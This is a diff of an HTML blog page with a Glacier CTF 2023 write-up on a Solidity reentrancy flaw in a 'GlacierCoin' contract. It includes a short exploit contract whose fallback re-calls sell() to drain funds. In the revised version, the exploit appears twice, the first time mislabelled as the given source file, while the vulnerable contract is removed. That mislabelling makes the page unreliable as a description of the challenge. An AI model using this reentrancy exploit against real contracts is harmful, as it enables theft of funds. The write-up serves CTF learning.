@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <title>Blog Post Title | Rudra Pratap Singh</title>
+  <title>Glacier CTF 2023 Writeup | Rudra Pratap Singh</title>
 
   <!-- Bootstrap CSS -->
   <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" 
@@ -59,7 +59,7 @@
       background-color: #f4f4f4;
       border-radius: 5px;
       padding: 10px;
-      overflow-x: auto; /* Enables horizontal scrolling for long lines */
+      overflow-x: auto;
       font-family: 'Courier New', monospace;
       line-height: 1.5;
     }
@@ -70,6 +70,24 @@
       font-family: 'Courier New', monospace;
       padding: 2px 5px;
     }
+
+    /* Back button styling */
+    .back-button {
+      display: block;
+      width: 100px;
+      margin: 30px auto;
+      padding: 10px 20px;
+      background-color: #007bff;
+      color: white;
+      text-align: center;
+      border-radius: 5px;
+      text-decoration: none;
+      transition: background-color 0.3s;
+    }
+
+    .back-button:hover {
+      background-color: #0056b3;
+    }
   </style>
 </head>
 
@@ -78,61 +96,57 @@
     <h1>Glacier CTF 2023 Writeup</h1>
     <div class="meta">Published on 8th December 2023 by 0xrudra</div>
     <div class="content">
-        <p>Embarking on a journey to regularly update my blog, here's my initial attempt at a CTF write-up. I participated in GlacierCTF with my team, thehackerscrew, and we achieved an impressive 5th place finish.</p>
-        <h2>Glacier Coin</h2>
-        
-      <p>
-        We were given the source file which looks like this:
-      </p>
-      <pre><code>// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.18;
-
-contract GlacierCoin
-{
-    function buy() public payable
-    {
-        _mint(msg.value, msg.sender);
-    }
-    function sell(uint256 amount) public
-    {
-        require(balances[msg.sender] >= amount, "You can not sell this much as you are poor af");
-        uint256 new_balance = balances[msg.sender] - amount;
-        (msg.sender).call{value: amount}("");
-        balances[msg.sender] = new_balance;
-    }
-    function _mint(uint256 amount, address target) internal
-    {
-        balances[target] += amount;
-    }   
-}</code></pre>
-<p></br>
-    A careful examination reveals a pattern characteristic of the well-known reentrancy attack: <code>(msg.sender).call{value: amount}("");</code>. This pattern enables the caller, or 'msg.sender', to initiate a callback to their own address, potentially a smart contract. To delve deeper into reentrancy attacks, you can find more information <a href="https://solidity-by-example.org/hacks/re-entrancy/">here</a>.
-  <br>
-  The 'sell()' function in our context lacks a reentrancy guard and doesn't adhere to the checks-effects-interactions pattern. Consequently, invoking 'sell()' from a smart contract allows for the possibility of reentering the same function. As the contract attempts to transfer funds, our contract can trigger 'sell()' again. Since the contract's state isn't updated immediately, it erroneously permits the redemption of more funds than were initially deposited.
- <br>
-<pre><code>// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
-
-import "./Challenge.sol";
-
-contract Exploit {
-    GlacierCoin public coin; 
-    constructor(address _target) payable {
-        coin = GlacierCoin(_target);
-    }
+      <p>Embarking on a journey to regularly update my blog, here's my initial attempt at a CTF write-up. I participated in GlacierCTF with my team, thehackerscrew, and we achieved an impressive 5th place finish.</p>
+      <h2>Glacier Coin</h2>
+      <p>We were given the source file which looks like this:</p>
+   <br>
+   <pre><code>// SPDX-License-Identifier: MIT
+    pragma solidity ^0.8.0;
     
-    fallback() external payable {
-
-       coin.sell(10 ether);
+    import "./Challenge.sol";
+    
+    contract Exploit {
+        GlacierCoin public coin; 
+        constructor(address _target) payable {
+            coin = GlacierCoin(_target);
+        }
         
-    }
-    function attack() external payable {
-        coin.buy{value: 10 ether}();
-        coin.sell(10 ether);
-    }</code></pre>
-</p></br>
-  </div>
-  
+        fallback() external payable {
+    
+           coin.sell(10 ether);
+            
+        }
+        function attack() external payable {
+            coin.buy{value: 10 ether}();
+            coin.sell(10 ether);
+        }</code></pre>
+
+      <p>A careful examination reveals a pattern characteristic of the well-known reentrancy attack: <code>(msg.sender).call{value: amount}("");</code>. This pattern enables the caller, or 'msg.sender', to initiate a callback to their own address, potentially a smart contract. To delve deeper into reentrancy attacks, you can find more information <a href="https://solidity-by-example.org/hacks/re-entrancy/">here</a>.</p>
+      <p>The 'sell()' function in our context lacks a reentrancy guard and doesn't adhere to the checks-effects-interactions pattern. Consequently, invoking 'sell()' from a smart contract allows for the possibility of reentering the same function. As the contract attempts to transfer funds, our contract can trigger 'sell()' again. Since the contract's state isn't updated immediately, it erroneously permits the redemption of more funds than were initially deposited.</p>
+      <pre><code>// SPDX-License-Identifier: MIT
+        pragma solidity ^0.8.0;
+        
+        import "./Challenge.sol";
+        
+        contract Exploit {
+            GlacierCoin public coin; 
+            constructor(address _target) payable {
+                coin = GlacierCoin(_target);
+            }
+            
+            fallback() external payable {
+        
+               coin.sell(10 ether);
+                
+            }
+            function attack() external payable {
+                coin.buy{value: 10 ether}();
+                coin.sell(10 ether);
+            }</code></pre>
+    </div>
+
+    <!-- Back Button -->
+    <a href="javascript:history.back()" class="back-button">Back</a>
   </div>
 </body>
 </html>
